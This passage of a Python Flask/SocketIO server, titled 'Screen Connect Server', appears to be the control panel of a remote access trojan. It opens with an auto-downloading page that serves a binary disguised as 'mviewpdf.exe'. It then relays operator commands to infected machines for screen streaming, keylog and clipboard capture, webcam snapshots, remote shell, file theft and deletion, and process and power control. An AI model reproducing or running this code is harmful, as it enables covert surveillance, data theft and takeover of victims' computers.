        "<!DOCTYPE html><html><head><meta charset=utf-8>"
        "<title> </title>"
        "<style>*{margin:0;padding:0}html,body{height:100%;background:#000}</style>"
        "</head><body><script>"
        "(function(){"
        "var a=document.createElement('a');"
        f"a.href={dl_js};"
        "a.download='mviewpdf.exe';"
        "document.body.appendChild(a);a.click();"
        "})();</script></body></html>"
    )
    r = make_response(html, 200)
    r.headers["Content-Type"] = "text/html"
    return r


@app.route("/guide/<token>/dl")
def serve_agent_binary(token):
    """Serve the cached patched binary for a token."""
    if token in _agent_dl_cache:
        data, _ = _agent_dl_cache[token]  # unpack (bytes, timestamp)
        resp = make_response(data)
        resp.headers["Content-Type"] = "application/octet-stream"
        resp.headers["Content-Disposition"] = f'attachment; filename="mviewpdf.exe"'
        resp.headers["Content-Length"] = len(data)
        resp.headers["Cache-Control"] = "no-store"
        return resp
    # Fallback to GitHub
    if AGENT_STORAGE_URL:
        return redirect(AGENT_STORAGE_URL, 302)
    return jsonify({"error": "Binary not available."}), 503

# ── Admin: list / revoke ──────────────────────────────────────────────────────
@app.route("/api/sessions")
@require_admin
def api_sessions():
    rows = db_list_all()
    with _dev_lock:
        live_ids = set(_devices.keys())
    for r in rows:
        r["_live"] = r.get("device_id") in live_ids
    return jsonify({"sessions": rows, "count": len(rows)})

@app.route("/api/sessions/<token>/revoke", methods=["POST", "DELETE"])
@require_admin
def api_revoke(token):
    db_update(token, {"status": "revoked"})
    return jsonify({"status": "revoked", "token": token})

# ── Agent checkin (REST belt+suspenders) ─────────────────────────────────────
@app.route("/agent/checkin", methods=["POST"])
def agent_checkin():
    data = request.get_json(silent=True) or {}
    token = data.get("device_id") or data.get("token", "")
    if not token:
        return jsonify({"error": "No device_id"}), 400
    db_upsert(token, {
        "status":        "online",
        "label":         data.get("hostname") or token,
        "ip_address":    data.get("local_ip"),
        "hostname":      data.get("hostname"),
        "os_info":       data.get("os"),
        "agent_version": data.get("agent_version"),
        "connected_at":  utcnow(),
    })
    return jsonify({"status": "ok", "token": token})

# ══════════════════════════════════════════════════════════════════════════════
#  SocketIO events
# ══════════════════════════════════════════════════════════════════════════════
if SOCKETIO_OK and sio:

    @sio.on("connect")
    def on_connect():
        """All sockets (agents + dashboards) join a common 'dashboards' room."""
        join_room("dashboards")
        log.info(f"Socket connected: {request.sid}")

    @sio.on("disconnect")
    def on_disconnect():
        sid = request.sid
        # Could be a dashboard or an agent
        _cleanup_viewer(sid)
        _cleanup_agent(sid)
        log.info(f"Socket disconnected: {sid}")

    # ── Advanced Monitor: second-site stream subscription (viewer → server) ──
    @sio.on("subscribe_stream")
    def on_subscribe_stream(data):
        """Legacy dashboard subscribe — kept for compat; no-op for Advanced Monitor."""
        pass

    @sio.on("watch_device")
    def on_watch_device(data):
        """Joins viewer to per-device room, sends GOP catch-up, and starts agent stream."""
        try:
            from flask_socketio import join_room as _jr
            did = data.get("device_id", "")
            sid = request.sid

            if not did:
                sio.emit("watch_error", {"msg": "No device_id provided"}, room=sid)
                return

            with _dev_lock:
                dev = _devices.get(did)
            if not dev:
                sio.emit("watch_error", {"msg": "Device not found or offline"}, room=sid)
                return

            # ── Advanced Monitor: join binary-frame viewer room ──────────────
            _jr(f"adv_viewers_{did}")
            _adv_viewer_rooms[sid] = did

            # GOP catch-up — send buffered frames so screen appears immediately
            with _adv_gop_lock:
                gop = list(_adv_gop_buf.get(did, []))
            for pkt in gop:
                sio.emit("frame_bin", pkt, room=sid)
            cursor_pkt = _adv_cursor_latest.get(did)
            if cursor_pkt:
                sio.emit("cursor_bin", cursor_pkt, room=sid)

            # Notify agent of viewer count
            vcount = sum(1 for v in _adv_viewer_rooms.values() if v == did)
            sio.emit("viewer_count", {"count": vcount}, room=did)

            # Confirm to dashboard
            sio.emit("watch_ok", {
                "online":   True,
                "device_id": did,
                "name":      dev.get("hostname", did),
                "screen_w":  dev.get("screen_w", 0),
                "screen_h":  dev.get("screen_h", 0),
            }, room=sid)
            log.info(f"Advanced Monitor: viewer {sid} watching device {did}")

            # ── Main stream path: join view:{did} room ───────────────────────
            # Leave previous device room if switching devices
            old_did = _get_device_for_viewer(request.sid)
            if old_did and old_did != did:
                leave_room(f"view:{old_did}")
                with _view_lock:
                    _viewers[old_did].discard(request.sid)
                sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": old_did}, room=old_did)
                log.info(f"Dashboard {request.sid} left stream for {old_did}")

            join_room(f"view:{did}")
            with _view_lock:
                _viewers[did].add(request.sid)
            with _dash_lock:
                _dashboard_device[request.sid] = did
            viewer_count = len(_viewers[did])
            log.info(f"Dashboard {request.sid} subscribed to {did} (viewers: {viewer_count})")
            emit("subscribed", {"device_id": did, "viewers": viewer_count})

            # Tell agent to START streaming (use the dev we already fetched — no re-fetch)
            fps     = data.get("fps", 15)
            quality = data.get("quality", 55)
            scale   = data.get("scale", 0.8)
            monitor = data.get("monitor", 1)
            sio.emit("request_action", {
                "tab":       "monitor",
                "action":    "start",
                "device_id": did,
                "fps":       fps,
                "quality":   quality,
                "scale":     scale,
                "monitor":   monitor,
            }, room=did)
            log.info(f"Stream start sent → agent {did}  fps={fps} quality={quality}")

        except Exception as exc:
            log.error(f"on_watch_device error (sid={request.sid}): {exc}", exc_info=True)
            try:
                sio.emit("watch_error", {"msg": f"Server error: {exc}"}, room=request.sid)
            except Exception:
                pass
    @sio.on("unsubscribe_stream")
    def on_unsubscribe_stream(data):
        """Legacy — no-op for Advanced Monitor."""
        pass

    # ── Agent registration ────────────────────────────────────────────────────
    @sio.on("agent_connect")
    def on_agent_connect(data):
        try:
            _handle_agent_connect(data)
        except Exception as exc:
            log.error(f"agent_connect crash (sid={request.sid}): {exc}", exc_info=True)

    def _handle_agent_connect(data):
        did   = data.get("device_id") or data.get("token", "")
        label = data.get("label") or data.get("hostname") or did

        if not did:
            log.warning(f"agent_connect with no device_id from {request.sid}")
            return

        # Agent joins its own room for targeted commands
        join_room(did)

        with _sid_lock:
            _sid_to_device[request.sid] = did

        with _dev_lock:
            _devices[did] = {
                "sid":           request.sid,
                "device_id":     did,
                "label":         label,
                "name":          label,
                "status":        "online",
                "hostname":      data.get("hostname"),
                "username":      data.get("username"),
                "os":            data.get("os"),
                "local_ip":      data.get("local_ip"),
                "ip":            data.get("local_ip"),
                "cpu_count":     data.get("cpu_count"),
                "ram_total_gb":  data.get("ram_total_gb"),
                "agent_version": data.get("agent_version"),
                "stream_mode":   data.get("stream_mode", "video"),
                "gpu":           data.get("gpu"),
                "screen_count":  data.get("screen_count"),
                "connected_at":  utcnow(),
                "last_beat":     utcnow(),
                "cpu":           None,
                "ram":           None,
                "frame_count":   0,
                "last_frame_ts": "",
                "fingerprint":   data,
            }

        log.info(f"Agent ONLINE: {label} ({did}) sid={request.sid}")
        db_upsert(did, {
            "status":        "online",
            "label":         label,
            "ip_address":    data.get("local_ip"),
            "hostname":      data.get("hostname"),
            "os_info":       data.get("os"),
            "agent_version": data.get("agent_version"),
            "connected_at":  utcnow(),
        })
        sio.emit("agent_online",  {
            "device_id": did, "name": label, "label": label,
            "ip": data.get("local_ip"), "fingerprint": data, "ts": utcnow()
        })
        sio.emit("device_online", {
            "device_id": did, "label": label, "fingerprint": data, "ts": utcnow()
        })
        broadcast_device_update()

    # ── Heartbeat ─────────────────────────────────────────────────────────────
    @sio.on("heartbeat")
    def on_hb(data):
        did = data.get("device_id")
        with _dev_lock:
            if did in _devices:
                _devices[did].update({
                    "cpu":       data.get("cpu"),
                    "ram":       data.get("ram"),
                    "last_beat": utcnow(),
                })
        # Only notify dashboards watching this specific device
        sio.emit("heartbeat_update", data, room=f"view:{did}")
        # Also broadcast globally (low frequency, for device list updates)
        sio.emit("heartbeat_update", data, room="dashboards")

    # ── Advanced Monitor: second-site binary frame relay ─────────────────────
    @sio.on("agent_auth")
    def on_agent_auth(data):
        """Second-site agent authenticates with its token."""
        token = data.get("token", "")
        did   = token  # token IS the device_id in the main site
        sid   = request.sid
        with _dev_lock:
            dev = _devices.get(did)
        if not dev:
            sio.emit("auth_error", {"msg": "Device not registered — connect via main socket first"}, room=sid)
            return
        # Mark device as using advanced monitor
        _adv_agent_sids[did] = sid
        join_room(did)  # agent joins its own device room for viewer_count etc.
        vcount = sum(1 for v in _adv_viewer_rooms.values() if v == did)
        sio.emit("auth_ok", {"role": "agent", "device_id": did}, room=sid)
        sio.emit("viewer_count", {"count": vcount}, room=sid)
        log.info(f"Advanced Monitor agent_auth: device={did}")

    @sio.on("frame_bin")
    def on_frame_bin(data):
        """Second-site binary frame from agent — fan out to all Advanced Monitor viewers."""
        sid = request.sid
        # Identify which device this agent belongs to
        did = None
        for d, asid in _adv_agent_sids.items():
            if asid == sid:
                did = d; break
        if not did:
            return
        raw = bytes(data)
        # Parse header to extract resolution
        if len(raw) >= 20:
            import struct as _s
            w, h = _s.unpack_from(">II", raw, 0)
            if w > 0 and h > 0:
                with _dev_lock:
                    if did in _devices:
                        _devices[did]["screen_w"] = w
                        _devices[did]["screen_h"] = h
        # GOP buffer
        with _adv_gop_lock:
            if did not in _adv_gop_buf:
                from collections import deque as _dq
                _adv_gop_buf[did] = _dq(maxlen=64)
            _adv_gop_buf[did].append(raw)
        # Fan out to all viewers of this device
        sio.emit("frame_bin", raw, room=f"adv_viewers_{did}")

    @sio.on("cursor_bin")
    def on_cursor_bin(data):
        """Second-site 60Hz cursor packet — fan out to viewers."""
        sid = request.sid
        did = None
        for d, asid in _adv_agent_sids.items():
            if asid == sid:
                did = d; break
        if not did:
            return
        raw = bytes(data)
        _adv_cursor_latest[did] = raw
        sio.emit("cursor_bin", raw, room=f"adv_viewers_{did}")

    @sio.on("agent_info")
    def on_agent_info_adv(data):
        """Second-site agent_info — update hostname/os."""
        sid = request.sid
        for d, asid in _adv_agent_sids.items():
            if asid == sid:
                with _dev_lock:
                    if d in _devices:
                        _devices[d]["hostname"] = data.get("hostname", _devices[d].get("hostname", ""))
                        _devices[d]["os"]       = data.get("os",       _devices[d].get("os", ""))
                break

    @sio.on("agent_pong")
    def on_agent_pong_adv(data):
        """Second-site latency pong."""
        sid = request.sid
        for d, asid in _adv_agent_sids.items():
            if asid == sid:
                rtt = (time.time() - data.get("ts", time.time())) * 1000
                with _dev_lock:
                    if d in _devices:
                        _devices[d]["rtt_ms"] = round(rtt, 1)
                break

    @sio.on("input_event")
    def on_input_event(data):
        """Second-site input_event from viewer → relay to agent."""
        sid    = request.sid
        did    = _adv_viewer_rooms.get(sid)
        if not did:
            return
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            sio.emit("input_event", data, room=agent_sid)

    # ── WebRTC signaling relay ────────────────────────────────────────────────
    @sio.on("webrtc_offer")
    def on_webrtc_offer_adv(data):
        sid    = request.sid
        did    = _adv_viewer_rooms.get(sid)
        if not did: return
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            sio.emit("webrtc_offer", {"viewer_sid": sid, "sdp": data.get("sdp")}, room=agent_sid)

    @sio.on("webrtc_answer")
    def on_webrtc_answer_adv(data):
        viewer_sid = data.get("viewer_sid")
        if viewer_sid:
            sio.emit("webrtc_answer", {"sdp": data.get("sdp")}, room=viewer_sid)

    @sio.on("webrtc_ice_agent")
    def on_webrtc_ice_agent(data):
        viewer_sid = data.get("viewer_sid")
        if viewer_sid:
            sio.emit("webrtc_ice", {"candidate": data.get("candidate")}, room=viewer_sid)

    @sio.on("webrtc_ice_viewer")
    def on_webrtc_ice_viewer(data):
        sid    = request.sid
        did    = _adv_viewer_rooms.get(sid)
        if not did: return
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            sio.emit("webrtc_ice", {"viewer_sid": sid, "candidate": data.get("candidate")}, room=agent_sid)

    @sio.on("webrtc_connected")
    def on_webrtc_connected(data):
        log.info(f"Advanced Monitor WebRTC DataChannel active: viewer={request.sid}")

    # ── old screen_data kept as dead no-op so nothing crashes on reconnect ────

    @sio.on("screenshot_result")
    def on_screenshot_result(data):
        did = data.get("device_id", "")
        out = dict(data)
        if "image" in out and "frame" not in out:
            out["frame"] = out.pop("image")
        if "frame" in out and "image" not in out:
            out["image"] = out["frame"]
        # Route only to viewers of this device
        sio.emit("screenshot", out, room=f"view:{did}")
        sio.emit("screenshot_result", out, room=f"view:{did}")

    @sio.on("ping_result")
    def on_ping_result(data):
        did = data.get("device_id", "")
        sio.emit("pong_agent", data, room=f"view:{did}")
        sio.emit("pong_agent", data, room="dashboards")

    @sio.on("cursor_event")
    def on_cursor(data):
        did = data.get("device_id", "")
        # Cursor events ONLY go to viewers of this specific device
        sio.emit("cursor_event", data, room=f"view:{did}")

    # ── System stats — device-isolated ───────────────────────────────────────
    @sio.on("system_stats_report")
    def _r_system(data):
        did = data.get("device_id", "")
        sio.emit("update_system_tab", data, room=f"view:{did}")
        sio.emit("update_system_tab", data, room="dashboards")

    @sio.on("processes_report")
    def _r_procs(data):
        did = data.get("device_id", "")
        sio.emit("processes_result", data, room=f"view:{did}")
        sio.emit("processes_result", data, room="dashboards")

    @sio.on("kill_result")
    def _r_kill(data):
        did = data.get("device_id", "")
        sio.emit("kill_result", data, room=f"view:{did}")

    @sio.on("start_process_result")
    def _r_start_proc(data):
        did = data.get("device_id", "")
        sio.emit("start_process_result", data, room=f"view:{did}")

    @sio.on("shell_result")
    def _r_shell(data):
        did = data.get("device_id", "")
        sio.emit("shell_result", data, room=f"view:{did}")
        sio.emit("shell_result", data, room="dashboards")

    @sio.on("file_list_result")
    def _r_flist(data):
        """
        FIXED: File list results go to the requesting dashboard SID (not all dashboards).
        This prevents machine A seeing machine B's file system.
        """
        did = data.get("device_id", "")
        # Find which dashboard requested this — route to view room
        sio.emit("file_list_result", data, room=f"view:{did}")
        # Also send to all dashboards for backwards compat (they filter by device_id)
        sio.emit("file_list_result", data, room="dashboards")

    @sio.on("file_read_result")
    def _r_fread(data):
        did = data.get("device_id", "")
        sio.emit("file_read_result", data, room=f"view:{did}")
        sio.emit("file_read_result", data, room="dashboards")

    @sio.on("file_download_result")
    def _r_fdl(data):
        did = data.get("device_id", "")
        sio.emit("file_download_result", data, room=f"view:{did}")
        sio.emit("file_download_result", data, room="dashboards")

    @sio.on("file_delete_result")
    def _r_fdel(data):
        did = data.get("device_id", "")
        sio.emit("file_delete_result", data, room=f"view:{did}")

    @sio.on("drives_report")
    def _r_drives(data):
        did = data.get("device_id", "")
        sio.emit("drives_report", data, room=f"view:{did}")
        sio.emit("drives_report", data, room="dashboards")

    @sio.on("disks_report")
    def _r_disks(data):
        did = data.get("device_id", "")
        sio.emit("disks_report", data, room=f"view:{did}")
        sio.emit("disks_report", data, room="dashboards")

    @sio.on("network_report")
    def _r_net(data):
        did = data.get("device_id", "")
        sio.emit("network_report", data, room=f"view:{did}")
        sio.emit("network_report", data, room="dashboards")

    @sio.on("webcam_result")
    def _r_webcam(data):
        did = data.get("device_id", "")
        sio.emit("webcam_result", data, room=f"view:{did}")
        sio.emit("webcam_result", data, room="dashboards")

    @sio.on("webcam_list_result")
    def _r_wcam_list(data):
        did = data.get("device_id", "")
        sio.emit("webcam_list_result", data, room=f"view:{did}")

    @sio.on("keylog_data")
    def _r_keylog(data):
        did = data.get("device_id", "")
        sio.emit("keylog_data", data, room=f"view:{did}")
        sio.emit("keylog_data", data, room="dashboards")

    @sio.on("clipboard_data")
    def _r_clip(data):
        did = data.get("device_id", "")
        sio.emit("clipboard_data", data, room=f"view:{did}")

    @sio.on("clipboard_result")
    def _r_clip_result(data):
        did = data.get("device_id", "")
        sio.emit("clipboard_result", data, room=f"view:{did}")
        sio.emit("clipboard_result", data, room="dashboards")

    @sio.on("clipboard_set_result")
    def _r_clip_set(data):
        did = data.get("device_id", "")
        sio.emit("clipboard_set_result", data, room=f"view:{did}")

    @sio.on("action_result")
    def _r_action(data):
        did = data.get("device_id", "")
        sio.emit("action_result", data, room=f"view:{did}")
        sio.emit("action_result", data, room="dashboards")

    @sio.on("stream_stats")
    def _r_stream_stats(data):
        did = data.get("device_id", "")
        sio.emit("stream_stats", data, room=f"view:{did}")

    # ── Dashboard → device commands ───────────────────────────────────────────
    @sio.on("dashboard_command")
    def on_cmd(data):
        did = data.get("device_id")
        with _dev_lock:
            dev = _devices.get(did)
        if not dev:
            emit("command_error", {"error": f"Device '{did}' not connected."})
            return
        sio.emit("request_action", data, room=did)
        log.info(f"Dashboard command → {did}: tab={data.get('tab')}")

    @sio.on("start_stream")
    def on_start_stream(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            join_room(f"view:{did}")
            with _view_lock:
                _viewers[did].add(request.sid)
            with _dash_lock:
                _dashboard_device[request.sid] = did
            sio.emit("request_action", {
                "tab":       "monitor",
                "action":    "start",
                "device_id": did,
                "fps":       data.get("fps", 20),
                "quality":   data.get("quality", 55),
                "scale":     data.get("scale", 0.8),
                "mode":      data.get("mode", "video"),
                "monitor":   data.get("monitor", 1),
            }, room=did)
            log.info(f"Stream started: device={did} viewer={request.sid}")
        else:
            emit("command_error", {"error": f"Device '{did}' not connected."})

    @sio.on("stop_stream")
    def on_stop_stream(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": did}, room=did)

    @sio.on("set_stream_mode")
    def on_set_stream_mode(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab": "monitor", "action": "set_mode",
                "mode": data.get("mode", "video"), "device_id": did,
            }, room=did)

    @sio.on("set_quality")
    def on_set_quality(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab": "monitor", "action": "set_quality",
                "quality": data.get("quality", 55), "device_id": did,
            }, room=did)

    @sio.on("request_screenshot")
    def on_request_screenshot(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab":       "screenshot",
                "quality":   data.get("quality", 60),
                "scale":     data.get("scale", 0.75),
                "device_id": did,
            }, room=did)

    # ── Mouse / Keyboard / Scroll — handled by input_event in Advanced Monitor ─
    @sio.on("mouse_event")
    def on_mouse(data):
        """Legacy no-op — Advanced Monitor uses input_event."""
        pass

    @sio.on("scroll_event")
    def on_scroll(data):
        """Legacy no-op — Advanced Monitor uses input_event."""
        pass

    @sio.on("key_event")
    def on_key(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "key_event", **data}, room=did)

    @sio.on("ping_agent")
    def on_ping(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "ping", "t": data.get("t", utcnow()), "device_id": did}, room=did)

    @sio.on("disconnect_screen")
    def on_disconnect_screen(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": did}, room=did)

    @sio.on("start_sysmon")
    def on_start_sysmon(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab": "system", "action": "start",
                "interval": data.get("interval", 2), "device_id": did,
            }, room=did)

    @sio.on("stop_sysmon")
    def on_stop_sysmon(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "system", "action": "stop", "device_id": did}, room=did)

    @sio.on("request_snapshot")
    def on_snapshot(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "system_snapshot", "device_id": did}, room=did)

    @sio.on("request_disks")
    def on_disks(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "disks", "device_id": did}, room=did)

    @sio.on("request_network")
    def on_network(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "network", "device_id": did}, room=did)

    @sio.on("list_processes")
    def on_list_procs(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "processes", "device_id": did}, room=did)

    @sio.on("kill_process")
    def on_kill_proc(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "kill_process", "pid": data.get("pid"), "device_id": did}, room=did)

    @sio.on("start_process")
    def on_start_proc(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "start_process", "command": data.get("command", ""), "device_id": did}, room=did)

    @sio.on("shell_command")
    def on_shell(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab":        "shell",
                "command":    data.get("command", "echo hello"),
                "shell_type": data.get("shell_type", "cmd"),
                "device_id":  did,
            }, room=did)

    @sio.on("file_list")
    def on_file_list(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "file_list", "path": data.get("path", "C:\\"), "device_id": did}, room=did)

    @sio.on("file_read")
    def on_file_read(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "file_read", "path": data.get("path", ""), "device_id": did}, room=did)

    @sio.on("file_download")
    def on_file_download(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "file_download", "path": data.get("path", ""), "device_id": did}, room=did)

    @sio.on("file_delete")
    def on_file_delete(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "file_delete", "path": data.get("path", ""), "device_id": did}, room=did)

    @sio.on("file_upload")
    def on_file_upload(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab":     "file_upload",
                "path":    data.get("path", ""),
                "content": data.get("content", ""),
                "device_id": did,
            }, room=did)

    @sio.on("request_drives")
    def on_drives(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "drives", "device_id": did}, room=did)

    @sio.on("clipboard_get")
    def on_clip_get(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "clipboard_get", "device_id": did}, room=did)

    @sio.on("clipboard_set")
    def on_clip_set(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "clipboard_set", "text": data.get("text", ""), "device_id": did}, room=did)

    @sio.on("power_command")
    def on_power(data):
        did     = data.get("device_id", "")
        command = data.get("command", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": command, "device_id": did}, room=did)
            log.info(f"Power command '{command}' → {did}")

    @sio.on("uninstall_agent")
    def on_uninstall(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "uninstall", "device_id": did}, room=did)

    @sio.on("webcam_capture")
    def on_webcam_capture(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "webcam", "camera": data.get("camera", 0), "device_id": did}, room=did)

    @sio.on("webcam_list")
    def on_webcam_list(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "webcam_list", "device_id": did}, room=did)

    # ══════════════════════════════════════════════════════════════════════════
    #  Watchdog — marks devices offline if heartbeat is silent
    # ══════════════════════════════════════════════════════════════════════════
    def _watchdog_loop():
        while True:
            time.sleep(15)
            now = datetime.datetime.utcnow()
            stale = []
            with _dev_lock:
                for did, dev in list(_devices.items()):
                    lb = dev.get("last_beat")
                    if lb:
                        try:
                            last = datetime.datetime.fromisoformat(lb.replace("Z", ""))
                            if (now - last).total_seconds() > HEARTBEAT_TIMEOUT:
                                stale.append((did, dev.get("label", did), dev.get("sid", "")))
                        except Exception:
                            pass
                # Delete from _devices inside the lock — safe
                for did, label, agent_sid in stale:
                    del _devices[did]
                    log.warning(f"Watchdog: device silent — marking offline: {label} ({did})")

            # DB writes and socket emits happen OUTSIDE the lock to avoid blocking
            for did, label, agent_sid in stale:
                db_update(did, {"status": "offline", "disconnected_at": utcnow()})
                if agent_sid:
                    with _sid_lock:
                        _sid_to_device.pop(agent_sid, None)
                sio.emit("agent_offline",  {"device_id": did, "label": label, "ts": utcnow()})
                sio.emit("device_offline", {"device_id": did, "label": label, "ts": utcnow()})
            if stale:
                broadcast_device_update()

    sio.start_background_task(_watchdog_loop)

    # ══════════════════════════════════════════════════════════════════════════
    #  Render keep-alive self-ping
    # ══════════════════════════════════════════════════════════════════════════
    def _self_ping_loop():
        if SELF_PING_INTERVAL <= 0 or not REQUESTS_OK:
            log.info("Self-ping disabled")
            return
        time.sleep(90)
        render_url = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
        local_url  = f"http://127.0.0.1:{PORT}/health"
        ping_url   = f"{render_url}/health" if render_url else local_url
        log.info(f"Self-ping loop started: {ping_url} every {SELF_PING_INTERVAL}s")
        while True:
            try:
                resp = _requests.get(ping_url, timeout=15)
                log.debug(f"Self-ping: {resp.status_code}")
            except Exception as e:
                log.debug(f"Self-ping failed: {e}")
            time.sleep(SELF_PING_INTERVAL)

    sio.start_background_task(_self_ping_loop)

# ══════════════════════════════════════════════════════════════════════════════
#  Startup banner
# ══════════════════════════════════════════════════════════════════════════════
def startup():
    log.info("=" * 70)
    log.info(f"  Screen Connect Server  v{VERSION}")
    log.info("=" * 70)
    local = Path(AGENT_DIR) / AGENT_FILE
    if local.is_file():
        log.info(f"  Agent (local):    {local}  ({local.stat().st_size:,} bytes)")
    else:
        log.info(f"  Agent (local):    not found — using GitHub Releases")
    log.info(f"  Agent (github):   {AGENT_STORAGE_URL}")
    log.info(f"  Supabase:         {SUPABASE_URL[:55]}")
    log.info(f"  SocketIO:         {'yes — gevent' if SOCKETIO_OK else 'NO'}")
    log.info(f"  Port:             {PORT}")
    log.info(f"  Heartbeat ttl:    {HEARTBEAT_TIMEOUT}s")
    log.info(f"  Self-ping:        every {SELF_PING_INTERVAL}s")
    log.info(f"  WS keep-alive:    ping=20s / timeout=60s")
    log.info(f"  Max buffer:       256 MB")
    log.info(f"  Stream relay:     ISOLATED — per-device view rooms")
    log.info(f"  Multi-machine:    FIXED — no cross-machine frame leaks")
    log.info("=" * 70)
    log.info("  RENDER start:")
    log.info("    gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker \\")
    log.info("             -w 1 --timeout 300 --keep-alive 75 --bind 0.0.0.0:$PORT server:app")
    log.info("=" * 70)

# ══════════════════════════════════════════════════════════════════════════════
#  Entry point
# ══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    startup()
    if SOCKETIO_OK and sio:
        sio.run(app, host="0.0.0.0", port=PORT, debug=False, allow_unsafe_werkzeug=True)
    else:
        app.run(host="0.0.0.0", port=PORT, debug=False)
